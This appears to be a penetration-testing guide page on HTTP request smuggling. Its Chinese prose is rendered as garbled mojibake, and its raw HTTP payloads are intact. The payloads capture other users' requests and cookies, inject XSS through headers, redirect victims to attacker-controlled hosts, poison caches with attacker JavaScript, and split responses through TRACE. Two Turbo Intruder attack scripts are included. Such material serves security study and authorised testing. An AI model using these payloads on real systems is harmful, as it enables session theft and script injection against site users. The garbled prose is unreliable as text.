åº”ç”¨ç¨‹åºé€šå¸¸ä½¿ç”¨**å‰ç«¯æœåŠ¡å™¨**æ¥ä¿®æ”¹ä¼ å…¥è¯·æ±‚ï¼Œç„¶åå°†å…¶ä¼ é€’ç»™åç«¯æœåŠ¡å™¨ã€‚å…¸å‹çš„ä¿®æ”¹æ¶‰åŠæ·»åŠ å¤´ä¿¡æ¯ï¼Œä¾‹å¦‚`X-Forwarded-For: <IP of the client>`ï¼Œä»¥å°†å®¢æˆ·ç«¯çš„IPè½¬å‘ç»™åç«¯ã€‚ç†è§£è¿™äº›ä¿®æ”¹å¯èƒ½è‡³å…³é‡è¦ï¼Œå› ä¸ºå®ƒå¯èƒ½æ­ç¤º**ç»•è¿‡ä¿æŠ¤**æˆ–**å‘ç°éšè—çš„ä¿¡æ¯æˆ–ç«¯ç‚¹**çš„æ–¹æ³•ã€‚

è¦è°ƒæŸ¥ä»£ç†å¦‚ä½•æ›´æ”¹è¯·æ±‚ï¼Œæ‰¾åˆ°ä¸€ä¸ªåç«¯åœ¨å“åº”ä¸­å›æ˜¾çš„POSTå‚æ•°ã€‚ç„¶åï¼Œæ„é€ ä¸€ä¸ªè¯·æ±‚ï¼Œä½¿ç”¨è¿™ä¸ªå‚æ•°ä½œä¸ºæœ€åä¸€ä¸ªï¼Œç±»ä¼¼äºä»¥ä¸‹å†…å®¹ï¼š
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
åœ¨è¿™ä¸ªç»“æ„ä¸­ï¼Œåç»­è¯·æ±‚ç»„ä»¶è¢«é™„åŠ åœ¨ `search=` ä¹‹åï¼Œè¿™æ˜¯åœ¨å“åº”ä¸­åæ˜ çš„å‚æ•°ã€‚è¿™ä¸ªåæ˜ å°†æš´éœ²åç»­è¯·æ±‚çš„å¤´éƒ¨ã€‚

é‡è¦çš„æ˜¯è¦å°†åµŒå¥—è¯·æ±‚çš„ `Content-Length` å¤´ä¸å®é™…å†…å®¹é•¿åº¦å¯¹é½ã€‚å»ºè®®ä»ä¸€ä¸ªå°å€¼å¼€å§‹å¹¶é€æ¸å¢åŠ ï¼Œå› ä¸ºè¿‡ä½çš„å€¼ä¼šæˆªæ–­åæ˜ çš„æ•°æ®ï¼Œè€Œè¿‡é«˜çš„å€¼å¯èƒ½ä¼šå¯¼è‡´è¯·æ±‚å‡ºé”™ã€‚

è¯¥æŠ€æœ¯åœ¨ TE.CL æ¼æ´çš„ä¸Šä¸‹æ–‡ä¸­ä¹Ÿé€‚ç”¨ï¼Œä½†è¯·æ±‚åº”ä»¥ `search=\r\n0` ç»“æŸã€‚æ— è®ºæ¢è¡Œç¬¦å¦‚ä½•ï¼Œå€¼å°†é™„åŠ åˆ°æœç´¢å‚æ•°ä¸­ã€‚

æ­¤æ–¹æ³•ä¸»è¦ç”¨äºç†è§£å‰ç«¯ä»£ç†æ‰€åšçš„è¯·æ±‚ä¿®æ”¹ï¼ŒåŸºæœ¬ä¸Šè¿›è¡Œè‡ªæˆ‘å¯¼å‘çš„è°ƒæŸ¥ã€‚

### æ•è·å…¶ä»–ç”¨æˆ·çš„è¯·æ±‚ <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

é€šè¿‡åœ¨ POST æ“ä½œæœŸé—´å°†ç‰¹å®šè¯·æ±‚é™„åŠ ä¸ºå‚æ•°çš„å€¼ï¼Œå¯ä»¥æ•è·ä¸‹ä¸€ä¸ªç”¨æˆ·çš„è¯·æ±‚ã€‚ä»¥ä¸‹æ˜¯å¦‚ä½•å®ç°è¿™ä¸€ç‚¹çš„ï¼š 

é€šè¿‡å°†ä»¥ä¸‹è¯·æ±‚é™„åŠ ä¸ºå‚æ•°çš„å€¼ï¼Œæ‚¨å¯ä»¥å­˜å‚¨åç»­å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼š
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ**comment å‚æ•°**æ—¨åœ¨å­˜å‚¨åœ¨å…¬å¼€å¯è®¿é—®é¡µé¢ä¸Šå¸–å­è¯„è®ºéƒ¨åˆ†çš„å†…å®¹ã€‚å› æ­¤ï¼Œåç»­è¯·æ±‚çš„å†…å®¹å°†ä½œä¸ºè¯„è®ºå‡ºç°ã€‚

ç„¶è€Œï¼Œè¿™ç§æŠ€æœ¯æœ‰å…¶å±€é™æ€§ã€‚é€šå¸¸ï¼Œå®ƒä»…æ•è·ç›´åˆ°åœ¨èµ°ç§è¯·æ±‚ä¸­ä½¿ç”¨çš„å‚æ•°åˆ†éš”ç¬¦çš„æ•°æ®ã€‚å¯¹äº URL ç¼–ç çš„è¡¨å•æäº¤ï¼Œè¿™ä¸ªåˆ†éš”ç¬¦æ˜¯ `&` å­—ç¬¦ã€‚è¿™æ„å‘³ç€ä»å—å®³ç”¨æˆ·è¯·æ±‚ä¸­æ•è·çš„å†…å®¹å°†åœ¨ç¬¬ä¸€ä¸ª `&` å¤„åœæ­¢ï¼Œè¿™å¯èƒ½ç”šè‡³æ˜¯æŸ¥è¯¢å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ã€‚

æ­¤å¤–ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™ç§æ–¹æ³•åœ¨ TE.CL æ¼æ´ä¸­ä¹Ÿæ˜¯å¯è¡Œçš„ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¯·æ±‚åº”ä»¥ `search=\r\n0` ç»“æŸã€‚æ— è®ºæ¢è¡Œç¬¦å¦‚ä½•ï¼Œå€¼å°†é™„åŠ åˆ°æœç´¢å‚æ•°ä¸­ã€‚

### ä½¿ç”¨ HTTP è¯·æ±‚èµ°ç§æ¥åˆ©ç”¨åå°„å‹ XSS

HTTP è¯·æ±‚èµ°ç§å¯ä»¥è¢«åˆ©ç”¨æ¥æ”»å‡»æ˜“å— **åå°„å‹ XSS** çš„ç½‘é¡µï¼Œæä¾›æ˜¾è‘—çš„ä¼˜åŠ¿ï¼š

* ä¸éœ€è¦ä¸ç›®æ ‡ç”¨æˆ·è¿›è¡Œ **äº¤äº’**ã€‚
* å…è®¸åœ¨ **é€šå¸¸æ— æ³•è¾¾åˆ°** çš„è¯·æ±‚éƒ¨åˆ†åˆ©ç”¨ XSSï¼Œä¾‹å¦‚ HTTP è¯·æ±‚å¤´ã€‚

åœ¨ç½‘ç«™é€šè¿‡ User-Agent å¤´æ˜“å—åå°„å‹ XSS æ”»å‡»çš„æƒ…å†µä¸‹ï¼Œä»¥ä¸‹æœ‰æ•ˆè½½è·æ¼”ç¤ºäº†å¦‚ä½•åˆ©ç”¨æ­¤æ¼æ´ï¼š
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
è¿™ä¸ªæœ‰æ•ˆè½½è·çš„ç»“æ„æ—¨åœ¨åˆ©ç”¨æ¼æ´ï¼Œé€šè¿‡ä»¥ä¸‹æ–¹å¼ï¼š

1. å‘èµ·ä¸€ä¸ªçœ‹ä¼¼å…¸å‹çš„ `POST` è¯·æ±‚ï¼Œå¸¦æœ‰ `Transfer-Encoding: chunked` å¤´éƒ¨ä»¥æŒ‡ç¤ºå¼€å§‹èµ°ç§ã€‚
2. éšåè·Ÿéšä¸€ä¸ª `0`ï¼Œæ ‡è®°å—æ¶ˆæ¯ä½“çš„ç»“æŸã€‚
3. ç„¶åï¼Œå¼•å…¥ä¸€ä¸ªèµ°ç§çš„ `GET` è¯·æ±‚ï¼Œå…¶ä¸­ `User-Agent` å¤´éƒ¨æ³¨å…¥äº†ä¸€ä¸ªè„šæœ¬ï¼Œ`<script>alert(1)</script>`ï¼Œå½“æœåŠ¡å™¨å¤„ç†è¿™ä¸ªåç»­è¯·æ±‚æ—¶è§¦å‘ XSSã€‚

é€šè¿‡èµ°ç§æ“æ§ `User-Agent`ï¼Œè¯¥æœ‰æ•ˆè½½è·ç»•è¿‡äº†æ­£å¸¸è¯·æ±‚çº¦æŸï¼Œä»è€Œä»¥éæ ‡å‡†ä½†æœ‰æ•ˆçš„æ–¹å¼åˆ©ç”¨äº†åå°„å‹ XSS æ¼æ´ã€‚

#### HTTP/0.9

{% hint style="danger" %}
å¦‚æœç”¨æˆ·å†…å®¹åœ¨å“åº”ä¸­ä»¥ **`Content-type`** åå°„ï¼Œä¾‹å¦‚ **`text/plain`**ï¼Œå°†é˜»æ­¢ XSS çš„æ‰§è¡Œã€‚å¦‚æœæœåŠ¡å™¨æ”¯æŒ **HTTP/0.9ï¼Œå¯èƒ½å¯ä»¥ç»•è¿‡è¿™ä¸€ç‚¹**ï¼
{% endhint %}

ç‰ˆæœ¬ HTTP/0.9 æ—©äº 1.0ï¼Œä»…ä½¿ç”¨ **GET** åŠ¨è¯ï¼Œå¹¶ä¸” **ä¸** å“åº” **å¤´éƒ¨**ï¼Œåªæœ‰ä¸»ä½“ã€‚

åœ¨ [**è¿™ç¯‡æ–‡ç« **](https://mizu.re/post/twisty-python) ä¸­ï¼Œåˆ©ç”¨äº†è¯·æ±‚èµ°ç§å’Œä¸€ä¸ª **ä¼šå›å¤ç”¨æˆ·è¾“å…¥çš„è„†å¼±ç«¯ç‚¹** æ¥èµ°ç§ä¸€ä¸ª HTTP/0.9 è¯·æ±‚ã€‚å“åº”ä¸­åå°„çš„å‚æ•°åŒ…å«ä¸€ä¸ª **ä¼ªé€ çš„ HTTP/1.1 å“åº”ï¼ˆå¸¦æœ‰å¤´éƒ¨å’Œä¸»ä½“ï¼‰**ï¼Œå› æ­¤å“åº”å°†åŒ…å«æœ‰æ•ˆçš„å¯æ‰§è¡Œ JS ä»£ç ï¼Œ`Content-Type` ä¸º `text/html`ã€‚

### åˆ©ç”¨ HTTP è¯·æ±‚èµ°ç§è¿›è¡Œç«™å†…é‡å®šå‘ <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

åº”ç”¨ç¨‹åºé€šå¸¸é€šè¿‡ä½¿ç”¨é‡å®šå‘ URL ä¸­çš„ `Host` å¤´éƒ¨çš„ä¸»æœºåä»ä¸€ä¸ª URL é‡å®šå‘åˆ°å¦ä¸€ä¸ª URLã€‚è¿™åœ¨åƒ Apache å’Œ IIS è¿™æ ·çš„ Web æœåŠ¡å™¨ä¸­å¾ˆå¸¸è§ã€‚ä¾‹å¦‚ï¼Œè¯·æ±‚ä¸€ä¸ªæ²¡æœ‰å°¾éƒ¨æ–œæ çš„æ–‡ä»¶å¤¹ä¼šå¯¼è‡´é‡å®šå‘ä»¥åŒ…å«æ–œæ ï¼š
```
GET /home HTTP/1.1
Host: normal-website.com
```
ç»“æœä¸ºï¼š
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
å°½ç®¡çœ‹ä¼¼æ— å®³ï¼Œä½†è¿™ç§è¡Œä¸ºå¯ä»¥é€šè¿‡HTTPè¯·æ±‚èµ°ç§è¿›è¡Œæ“æ§ï¼Œä»¥å°†ç”¨æˆ·é‡å®šå‘åˆ°å¤–éƒ¨ç½‘ç«™ã€‚ä¾‹å¦‚ï¼š
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
è¿™ä¸ªè¢«èµ°ç§çš„è¯·æ±‚å¯èƒ½å¯¼è‡´ä¸‹ä¸€ä¸ªå¤„ç†çš„ç”¨æˆ·è¯·æ±‚è¢«é‡å®šå‘åˆ°æ”»å‡»è€…æ§åˆ¶çš„ç½‘ç«™ï¼š
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
ç»“æœä¸ºï¼š
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
åœ¨è¿™ä¸ªåœºæ™¯ä¸­ï¼Œç”¨æˆ·å¯¹ JavaScript æ–‡ä»¶çš„è¯·æ±‚è¢«åŠ«æŒã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡å“åº”æ¶æ„ JavaScript æ¥æ½œåœ¨åœ°å±å®³ç”¨æˆ·ã€‚

### é€šè¿‡ HTTP è¯·æ±‚èµ°ç§åˆ©ç”¨ Web ç¼“å­˜ä¸­æ¯’ <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

å¦‚æœ **å‰ç«¯åŸºç¡€è®¾æ–½çš„ä»»ä½•ç»„ä»¶ç¼“å­˜å†…å®¹**ï¼Œåˆ™å¯ä»¥æ‰§è¡Œ Web ç¼“å­˜ä¸­æ¯’ï¼Œé€šå¸¸æ˜¯ä¸ºäº†æé«˜æ€§èƒ½ã€‚é€šè¿‡æ“çºµæœåŠ¡å™¨çš„å“åº”ï¼Œå¯ä»¥ **æ¯’åŒ–ç¼“å­˜**ã€‚

ä¹‹å‰ï¼Œæˆ‘ä»¬è§‚å¯Ÿåˆ°å¦‚ä½•æ”¹å˜æœåŠ¡å™¨å“åº”ä»¥è¿”å› 404 é”™è¯¯ï¼ˆå‚è§ [åŸºæœ¬ç¤ºä¾‹](./#basic-examples)ï¼‰ã€‚åŒæ ·ï¼Œå¯ä»¥æ¬ºéª—æœåŠ¡å™¨ä»¥å“åº”å¯¹ `/static/include.js` çš„è¯·æ±‚è€Œæä¾› `/index.html` å†…å®¹ã€‚å› æ­¤ï¼Œ`/static/include.js` çš„å†…å®¹åœ¨ç¼“å­˜ä¸­è¢«æ›¿æ¢ä¸º `/index.html` çš„å†…å®¹ï¼Œä½¿å¾— `/static/include.js` å¯¹ç”¨æˆ·ä¸å¯è®¿é—®ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡æ‹’ç»ï¼ˆDoSï¼‰ã€‚

å¦‚æœå‘ç° **å¼€æ”¾é‡å®šå‘æ¼æ´** æˆ–è€…å­˜åœ¨ **æŒ‡å‘å¼€æ”¾é‡å®šå‘çš„ç«™å†…é‡å®šå‘**ï¼Œè¿™ç§æŠ€æœ¯å˜å¾—ç‰¹åˆ«å¼ºå¤§ã€‚è¿™äº›æ¼æ´å¯ä»¥è¢«åˆ©ç”¨æ¥å°† `/static/include.js` çš„ç¼“å­˜å†…å®¹æ›¿æ¢ä¸ºæ”»å‡»è€…æ§åˆ¶çš„è„šæœ¬ï¼Œä»è€Œå®è´¨ä¸Šä½¿æ‰€æœ‰è¯·æ±‚æ›´æ–°çš„ `/static/include.js` çš„å®¢æˆ·ç«¯é¢ä¸´å¹¿æ³›çš„è·¨ç«™è„šæœ¬ï¼ˆXSSï¼‰æ”»å‡»ã€‚

ä¸‹é¢æ˜¯åˆ©ç”¨ **ç¼“å­˜ä¸­æ¯’ç»“åˆç«™å†…é‡å®šå‘åˆ°å¼€æ”¾é‡å®šå‘** çš„ç¤ºä¾‹ã€‚ç›®æ ‡æ˜¯æ”¹å˜ `/static/include.js` çš„ç¼“å­˜å†…å®¹ï¼Œä»¥æä¾›ç”±æ”»å‡»è€…æ§åˆ¶çš„ JavaScript ä»£ç ï¼š
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
æ³¨æ„åµŒå…¥çš„è¯·æ±‚é’ˆå¯¹ `/post/next?postId=3`ã€‚è¯¥è¯·æ±‚å°†è¢«é‡å®šå‘åˆ° `/post?postId=4`ï¼Œåˆ©ç”¨ **Host å¤´éƒ¨å€¼** æ¥ç¡®å®šåŸŸåã€‚é€šè¿‡æ›´æ”¹ **Host å¤´éƒ¨**ï¼Œæ”»å‡»è€…å¯ä»¥å°†è¯·æ±‚é‡å®šå‘åˆ°ä»–ä»¬çš„åŸŸå (**ç«™å†…é‡å®šå‘åˆ°å¼€æ”¾é‡å®šå‘**)ã€‚

åœ¨æˆåŠŸçš„ **socket poisoning** ä¹‹åï¼Œåº”å‘èµ·å¯¹ `/static/include.js` çš„ **GET è¯·æ±‚**ã€‚è¯¥è¯·æ±‚å°†å—åˆ°å…ˆå‰ **ç«™å†…é‡å®šå‘åˆ°å¼€æ”¾é‡å®šå‘** è¯·æ±‚çš„æ±¡æŸ“ï¼Œå¹¶è·å–ç”±æ”»å‡»è€…æ§åˆ¶çš„è„šæœ¬å†…å®¹ã€‚

éšåï¼Œä»»ä½•å¯¹ `/static/include.js` çš„è¯·æ±‚å°†æä¾›æ”»å‡»è€…è„šæœ¬çš„ç¼“å­˜å†…å®¹ï¼Œæœ‰æ•ˆåœ°å‘èµ·å¹¿æ³›çš„ XSS æ”»å‡»ã€‚

### ä½¿ç”¨ HTTP è¯·æ±‚èµ°ç§è¿›è¡Œç½‘ç»œç¼“å­˜æ¬ºéª— <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **ç½‘ç»œç¼“å­˜ä¸­æ¯’å’Œç½‘ç»œç¼“å­˜æ¬ºéª—æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ**
>
> * åœ¨ **ç½‘ç»œç¼“å­˜ä¸­æ¯’** ä¸­ï¼Œæ”»å‡»è€…ä½¿åº”ç”¨ç¨‹åºåœ¨ç¼“å­˜ä¸­å­˜å‚¨ä¸€äº›æ¶æ„å†…å®¹ï¼Œå¹¶ä¸”è¿™äº›å†…å®¹ä»ç¼“å­˜ä¸­æä¾›ç»™å…¶ä»–åº”ç”¨ç¨‹åºç”¨æˆ·ã€‚
> * åœ¨ **ç½‘ç»œç¼“å­˜æ¬ºéª—** ä¸­ï¼Œæ”»å‡»è€…ä½¿åº”ç”¨ç¨‹åºåœ¨ç¼“å­˜ä¸­å­˜å‚¨å±äºå¦ä¸€ä¸ªç”¨æˆ·çš„ä¸€äº›æ•æ„Ÿå†…å®¹ï¼Œç„¶åæ”»å‡»è€…ä»ç¼“å­˜ä¸­æ£€ç´¢è¿™äº›å†…å®¹ã€‚

æ”»å‡»è€…æ„é€ ä¸€ä¸ªèµ°ç§è¯·æ±‚ï¼Œä»¥è·å–æ•æ„Ÿçš„ç”¨æˆ·ç‰¹å®šå†…å®¹ã€‚è€ƒè™‘ä»¥ä¸‹ç¤ºä¾‹ï¼š
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
å¦‚æœè¿™ä¸ªèµ°ç§è¯·æ±‚æ±¡æŸ“äº†ç”¨äºé™æ€å†…å®¹çš„ç¼“å­˜æ¡ç›®ï¼ˆä¾‹å¦‚ï¼Œ`/someimage.png`ï¼‰ï¼Œé‚£ä¹ˆå—å®³è€…åœ¨`/private/messages`ä¸­çš„æ•æ„Ÿæ•°æ®å¯èƒ½ä¼šè¢«ç¼“å­˜åˆ°é™æ€å†…å®¹çš„ç¼“å­˜æ¡ç›®ä¸‹ã€‚å› æ­¤ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šæ£€ç´¢åˆ°è¿™äº›ç¼“å­˜çš„æ•æ„Ÿæ•°æ®ã€‚

### é€šè¿‡HTTPè¯·æ±‚èµ°ç§æ»¥ç”¨TRACE <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

[**åœ¨è¿™ç¯‡æ–‡ç« ä¸­**](https://portswigger.net/research/trace-desync-attack) å»ºè®®å¦‚æœæœåŠ¡å™¨å¯ç”¨äº†TRACEæ–¹æ³•ï¼Œå¯èƒ½ä¼šé€šè¿‡HTTPè¯·æ±‚èµ°ç§è¿›è¡Œæ»¥ç”¨ã€‚è¿™æ˜¯å› ä¸ºè¯¥æ–¹æ³•ä¼šå°†å‘é€åˆ°æœåŠ¡å™¨çš„ä»»ä½•å¤´éƒ¨åå°„ä¸ºå“åº”ä½“çš„ä¸€éƒ¨åˆ†ã€‚ä¾‹å¦‚ï¼š
```
TRACE / HTTP/1.1
Host: example.com
XSS: <script>alert("TRACE")</script>
```
å°†å‘é€å¦‚ä¸‹å“åº”ï¼š
```
HTTP/1.1 200 OK
Content-Type: message/http
Content-Length: 115

TRACE / HTTP/1.1
Host: vulnerable.com
XSS: <script>alert("TRACE")</script>
X-Forwarded-For: xxx.xxx.xxx.xxx
```
ä¸€ä¸ªæ»¥ç”¨è¿™ç§è¡Œä¸ºçš„ä¾‹å­æ˜¯**é¦–å…ˆä¼ªè£…ä¸€ä¸ªHEADè¯·æ±‚**ã€‚è¿™ä¸ªè¯·æ±‚å°†åªä¼šè¿”å›ä¸€ä¸ªGETè¯·æ±‚çš„**å¤´éƒ¨**ï¼ˆ**`Content-Type`**åœ¨å…¶ä¸­ï¼‰ã€‚ç„¶åç«‹å³åœ¨HEADè¯·æ±‚åä¼ªè£…ä¸€ä¸ªTRACEè¯·æ±‚ï¼Œè¿™å°†**åå°„å‘é€çš„æ•°æ®**ã€‚\
ç”±äºHEADå“åº”å°†åŒ…å«ä¸€ä¸ª`Content-Length`å¤´éƒ¨ï¼Œ**TRACEè¯·æ±‚çš„å“åº”å°†è¢«è§†ä¸ºHEADå“åº”çš„ä¸»ä½“ï¼Œå› æ­¤åœ¨å“åº”ä¸­åå°„ä»»æ„æ•°æ®**ã€‚\
è¿™ä¸ªå“åº”å°†è¢«å‘é€åˆ°è¿æ¥ä¸Šçš„ä¸‹ä¸€ä¸ªè¯·æ±‚ï¼Œå› æ­¤è¿™å¯ä»¥**ç”¨äºç¼“å­˜çš„JSæ–‡ä»¶ä¸­ï¼Œä¾‹å¦‚æ³¨å…¥ä»»æ„JSä»£ç **ã€‚

### é€šè¿‡HTTPå“åº”æ‹†åˆ†æ»¥ç”¨TRACE <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

ç»§ç»­å…³æ³¨[**è¿™ç¯‡æ–‡ç« **](https://portswigger.net/research/trace-desync-attack)å»ºè®®äº†å¦ä¸€ç§æ»¥ç”¨TRACEæ–¹æ³•çš„æ–¹å¼ã€‚å¦‚è¯„è®ºæ‰€è¿°ï¼Œä¼ªè£…ä¸€ä¸ªHEADè¯·æ±‚å’Œä¸€ä¸ªTRACEè¯·æ±‚å¯ä»¥**æ§åˆ¶HEADè¯·æ±‚å“åº”ä¸­çš„ä¸€äº›åå°„æ•°æ®**ã€‚HEADè¯·æ±‚ä¸»ä½“çš„é•¿åº¦åŸºæœ¬ä¸Šåœ¨Content-Lengthå¤´éƒ¨ä¸­æŒ‡ç¤ºï¼Œå¹¶ç”±TRACEè¯·æ±‚çš„å“åº”å½¢æˆã€‚

å› æ­¤ï¼Œæ–°çš„æƒ³æ³•æ˜¯ï¼ŒçŸ¥é“è¿™ä¸ªContent-Lengthå’ŒTRACEå“åº”ä¸­ç»™å‡ºçš„æ•°æ®ï¼Œå¯ä»¥ä½¿TRACEå“åº”åœ¨Content-Lengthçš„æœ€åä¸€ä¸ªå­—èŠ‚ä¹‹ååŒ…å«ä¸€ä¸ªæœ‰æ•ˆçš„HTTPå“åº”ï¼Œä»è€Œå…è®¸æ”»å‡»è€…å®Œå…¨æ§åˆ¶ä¸‹ä¸€ä¸ªå“åº”çš„è¯·æ±‚ï¼ˆè¿™å¯ä»¥ç”¨äºæ‰§è¡Œç¼“å­˜ä¸­æ¯’ï¼‰ã€‚ 

ç¤ºä¾‹ï¼š
```
GET / HTTP/1.1
Host: example.com
Content-Length: 360

HEAD /smuggled HTTP/1.1
Host: example.com

POST /reflect HTTP/1.1
Host: example.com

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n
Content-Type: text/html\r\n
Cache-Control: max-age=1000000\r\n
Content-Length: 44\r\n
\r\n
<script>alert("response splitting")</script>
```
å°†ç”Ÿæˆè¿™äº›å“åº”ï¼ˆæ³¨æ„HEADå“åº”å…·æœ‰Content-Lengthï¼Œä½¿å¾—TRACEå“åº”æˆä¸ºHEADä¸»ä½“çš„ä¸€éƒ¨åˆ†ï¼Œä¸€æ—¦HEAD Content-Lengthç»“æŸï¼Œä¸€ä¸ªæœ‰æ•ˆçš„HTTPå“åº”è¢«èµ°ç§ï¼‰ï¼š
```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 165

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 243

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok
Content-Type: text/html
Cache-Control: max-age=1000000
Content-Length: 50

<script>alert(â€œarbitrary responseâ€)</script>
```
### åˆ©ç”¨HTTPå“åº”ä¸åŒæ­¥è¿›è¡ŒHTTPè¯·æ±‚èµ°ç§

æ‚¨æ˜¯å¦å‘ç°äº†ä¸€äº›HTTPè¯·æ±‚èµ°ç§æ¼æ´ï¼Œä½†ä¸çŸ¥é“å¦‚ä½•åˆ©ç”¨å®ƒï¼Ÿå°è¯•è¿™äº›å…¶ä»–çš„åˆ©ç”¨æ–¹æ³•ï¼š

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

### å…¶ä»–HTTPè¯·æ±‚èµ°ç§æŠ€æœ¯

* æµè§ˆå™¨HTTPè¯·æ±‚èµ°ç§ï¼ˆå®¢æˆ·ç«¯ï¼‰

{% content-ref url="browser-http-request-smuggling.md" %}
[browser-http-request-smuggling.md](browser-http-request-smuggling.md)
{% endcontent-ref %}

* HTTP/2é™çº§ä¸­çš„è¯·æ±‚èµ°ç§

{% content-ref url="request-smuggling-in-http-2-downgrades.md" %}
[request-smuggling-in-http-2-downgrades.md](request-smuggling-in-http-2-downgrades.md)
{% endcontent-ref %}

## Turbo intruderè„šæœ¬

### CL.TE

æ¥è‡ª [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

æ¥è‡ª: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## å·¥å…·

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
